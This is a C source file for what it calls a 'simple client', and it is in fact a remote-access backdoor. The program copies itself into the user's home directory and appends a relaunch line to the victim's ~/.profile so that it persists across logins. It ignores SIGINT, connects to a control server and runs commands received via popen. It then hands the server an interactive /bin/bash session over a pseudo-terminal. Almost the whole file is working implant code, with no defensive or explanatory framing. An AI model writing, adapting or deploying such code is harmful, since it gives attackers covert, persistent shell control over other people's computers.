// Simple client architecture
// Connects to host, reads message, disconnects
#define _XOPEN_SOURCE 600
#define _DEFAULT_SOURCE
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#define __USE_BSD
#include <termios.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <string.h>
#include <signal.h>

#include "simple_networking.h"

// global kill flag
int kill_rcv = 0;

void kill_handler(int sig)
{
  // This handles SIGINT attempts to kill the process
  // We don't do anything on the signal ;)
  kill_rcv = 1;
  printf("SIGINT Recv.\n");
}

int persistence(char *get_path, FILE *fp)
{
  //get_path without ".profile"
  char chunk[128];
  int len = strlen(get_path) - 8;
  get_path[len] = 0;

  //copy the executable to home directory
  char command[50] = "cp client ";
  strcat(command, get_path);
  system(command);

  strcat(get_path, "./client &");
  //check if .profile can be accessed
  if (fp == NULL)
  {
    return 0;
  }
  //check if our command is already written there
  while (fgets(chunk, sizeof(chunk), fp) != 0)
  {
    if (strstr(chunk, get_path) != 0)
    {
      return 0;
    }
  }

  fprintf(fp, "%s \n", get_path);
  fclose(fp);
  return 0;
}

int main(void)
{

  // Get the .profile file path for the victim's machine
  FILE *home_path = popen("echo $HOME/.profile", "r");
  ;
  char get_path[50];
  fscanf(home_path, "%s", get_path);
  pclose(home_path);

  // Open .profile file in append mode
  FILE *profile = fopen(get_path, "a+");
  persistence(get_path, profile);

  // LEAVE COMMENTED DURING DEV
  signal(SIGINT, kill_handler);
  connection server_con = connect_to("127.0.0.1", 8881);

  // Check if the struct has been filled
  if (server_con.dest_ip == NULL)
  {
    printf("[+] Could not connect to server.\n");
    exit(-1);
  }

  printf("[+] Client connected. IP: %s, Port: %d, Socket: %d\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);

  // Catch the hostname command and return it quickly
  message data_recieved = recieve_data(server_con);
  FILE *cmdptr;
  cmdptr = popen(data_recieved.data, "r");

  if (cmdptr == NULL)
  {
    // Oops, we couldn't open the pipe properly, notify the server
    char *errmsg = "ERROR: Could not open pipe to shell";
    send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
  }

  // Read data from pipe character-by-character into buffer
  char *buffer = malloc(10);
  char character_read;
  int length = 0;
  while ((character_read = fgetc(cmdptr)) != EOF)
  {
    // Place our character from the pipe into the buffer
    buffer[length] = character_read;
    length++;

    // Increase the buffer size if needed
    if (length == strlen(buffer))
    {
      buffer = realloc(buffer, length + 10);
    }
  }

  // Send the data and close the pipe
  send(server_con.sock_fd, buffer, strlen(buffer), 0);
  pclose(cmdptr);

  // Setting up a PTY session: http://rachid.koucha.free.fr/tech_corner/pty_pdip.html
  // Set up some file descriptors for interacting with the pty
  int master_fd;
  int slave_fd;
  int return_val;
  char input[250];

  // This tells the kernel we want to create a PTY
  master_fd = posix_openpt(O_RDWR);
  if (master_fd < 0)
  {
    char *errmsg = "ERROR: posix_openpt() failed";
    send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
    exit(-1);
  }

  // This changes the mode of the PTY so that we're the master
  return_val = grantpt(master_fd);
  if (return_val != 0)
  {
    char *errmsg = "ERROR: grantpt() failed";
    send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
    exit(-1);
  }

  // This tells the kernel to "unlock" the other end of the PTY, creating the slave end
  return_val = unlockpt(master_fd);
  if (return_val != 0)
  {
    char *errmsg = "ERROR: unlockpt() failed";
    send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
    exit(-1);
  }

  // Open the slave side ot the PTY
  slave_fd = open(ptsname(master_fd), O_RDWR);

  // Create the child process
  // The if statement returns true if we're the parent, and false if we're the child
  if (fork())
  {
    // We're the parent, we'll need to set up an array of(slave_fd to access the PTY
    fd_set forward_fds;

    // We don't need the slave end of the pipe
    close(slave_fd);

    while (1)
    {
      // Add our connection to the server and to the PTY into our group of file descriptors
      FD_ZERO(&forward_fds);
      FD_SET(server_con.sock_fd, &forward_fds);
      FD_SET(master_fd, &forward_fds);

      // See if there's a file descriptor ready to read
      return_val = select(master_fd + 1, &forward_fds, NULL, NULL, NULL);
      // I know, this is ugly... I tried implementing it as an if.. on the return val but that broke it :/
      switch (return_val)
      {
        case -1:
          fprintf(stderr, "Error %d on select\n", errno);
          sleep(1);
          break;
        
        default:
        // See if we've got something to read on our connection to the server
          if (FD_ISSET(server_con.sock_fd, &forward_fds))
          {
            // TODO make this variable length
            return_val = read(server_con.sock_fd, input, sizeof(input));
            // This means we don't attempt to write an empty string
            if (return_val > 0)
            {
              // This low level stuff doesn't play nicely with "Send to all" packets from the server
              // So we will fall back on popen() -- TODO

              
              // Send data on the master side of PTY
              // Keep in mind that return_val now holds the length of the string to read
              write(master_fd, input, return_val);
            }
            else if (return_val < 0)
            {
              fprintf(stderr, "Error %d on read sockfd\n", errno);
              exit(1);
            }
          }

          // See if bash has sent anything back
          if (FD_ISSET(master_fd, &forward_fds))
          {
            return_val = read(master_fd, input, sizeof(input));
            // Make sure we don't send an empty packet
            if (return_val > 0)
            {
              // Send data on to the server
              write(server_con.sock_fd, input, return_val);
            }
            else if (return_val < 0)
            {
              fprintf(stderr, "Error %d on read from bash\n", errno);
              exit(1);
            }
          }
          break;
      }
    }
  }
  else
  {
    // We're the child process now. We'll be changing some terminal attrs so we'll need to save them
    struct termios original_settings;
    struct termios new_settings;

    // Close the master side of the PTY
    close(master_fd);

    // Save the defaults parameters of the slave side of the PTY
    return_val = tcgetattr(slave_fd, &original_settings);

    // Set RAW mode on slave side of PTY
    new_settings = original_settings;
    cfmakeraw (&new_settings);
    tcsetattr (slave_fd, TCSANOW, &new_settings);

    // We need to be able to see what bash is doing, so redirect stdin/out/error to us
    close(0);
    close(1);
    close(2);
    dup(slave_fd);
    dup(slave_fd);
    dup(slave_fd);

    // Don't need the slave fd anymore
    close(slave_fd);

    // Make the current process a new session leader
    setsid();
    ioctl(0, TIOCSCTTY, 1);

    // Execvp is a bit funky with args, so create an empty array
    char *args[0];
    execvp("/bin/bash", args);

    // In theory we shouldn't get to here, so something has gone horribly wrong...
    exit(1);
  }

  return 0;
}